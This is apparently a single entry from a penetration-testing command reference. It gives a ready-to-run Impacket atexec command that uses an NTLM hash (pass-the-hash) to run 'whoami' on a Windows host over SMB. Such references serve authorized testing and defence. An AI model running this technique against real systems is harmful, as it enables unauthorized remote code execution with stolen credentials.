---
description: Schedule a task remotely over SMB using Impacket's atexec with NTLM Pass-the-Hash to execute a command.

Command Reference:
    Target IP: 10.10.10.1
    Domain: N/A
    Username: john
    Hash: 580B16D486D8D2CAFA00B314D41FA396 (NTLM hash)

command: |
  impacket-atexec -hashes 00000000000000000000000000000000:580B16D486D8D2CAFA00B314D41FA396 john@10.10.10.1 "whoami"

items:
  - Hash

services:
  - SMB
  - NTLM

OS:
  - Windows

attack_types:
  - Exploitation

references:
  - https://github.com/fortra/impacket
---
